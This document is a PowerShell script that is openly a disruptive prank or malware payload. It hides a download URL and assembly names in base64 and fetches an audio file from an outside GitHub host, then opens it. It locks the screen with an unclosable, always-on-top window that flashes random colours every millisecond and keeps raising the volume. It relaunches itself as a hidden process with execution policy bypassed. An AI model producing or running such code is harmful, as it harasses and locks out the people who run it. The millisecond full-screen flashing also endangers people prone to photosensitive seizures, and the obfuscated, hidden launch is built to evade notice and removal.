$chaos = {
    # 1. Load Windows Forms and Drawing Assemblies
    $formsName = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U3lzdGVtLldpbmRvd3MuRm9ybXM='))
    $drawingName = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U3lzdGVtLkRyYXdpbmc='))
    
    [void][Reflection.Assembly]::LoadWithPartialName($formsName)
    [void][Reflection.Assembly]::LoadWithPartialName($drawingName)

    # 2. Configure the Main Form
    $mainForm = New-Object System.Windows.Forms.Form
    $mainForm.FormBorderStyle = 'None'
    $mainForm.WindowState = 'Maximized'
    $mainForm.TopMost = $true
    $mainForm.BackColor = [System.Drawing.Color]::Black

    # Try to set the form icon to a system security shield
    try { 
        $iconPath = "$env:SystemRoot\System32\shell32.dll"
        $mainForm.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($iconPath) 
    } catch {
        # Fallback if icon extraction fails
    }

    # 3. Handle File Download and Audio
    $downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2VsbGlzMDkwL0VsbGlzLVBvcmplY3QzMjEyNTEyL2QxMDI3YjEwMTFlYTViMGNhZWRkMGZiNDI2MWUzNDAzZWEzZTQ0MzUvc29uZy5tcDM='))
    $tempFilePath = "$env:TEMP\s.mp3"
    
    # Start the download in a separate background job
    Start-Job -ScriptBlock { 
        param($url, $dest) 
        Invoke-WebRequest -Uri $url -OutFile $dest 
    } -ArgumentList $downloadUrl, $tempFilePath

    # 4. Set up the Chaos Loop (Timer)
    $chaosTimer = New-Object System.Windows.Forms.Timer
    $chaosTimer.Interval = 1
    
    # Prevent the user from closing the form via Alt+F4
    $mainForm.Add_FormClosing({
        $_.Cancel = $true
    })

    # The "Tick" event: Changes background color and maximizes volume
    $chaosTimer.Add_Tick({
        $red = Get-Random -Minimum 0 -Maximum 256
        $green = Get-Random -Minimum 0 -Maximum 256
        $blue = Get-Random -Minimum 0 -Maximum 256
        $mainForm.BackColor = [System.Drawing.Color]::FromArgb($red, $green, $blue)
        
        # Virtual key code 175 is Volume Up
        (New-Object -ComObject WScript.Shell).SendKeys([char]175)
    })

    # 5. Execution
    # Wait for the download to stabilize
    Start-Sleep -Seconds 10 
    if (Test-Path $tempFilePath) { 
        Start-Process $tempFilePath 
    }

    $chaosTimer.Start()
    $mainForm.ShowDialog()
}

# THE DETACH STEP: 
# Spawns the $chaos block as a new hidden process and immediately exits this window.
Start-Process powershell -ArgumentList "-WindowStyle Hidden", "-ExecutionPolicy Bypass", "-Command", $chaos.ToString()
exit
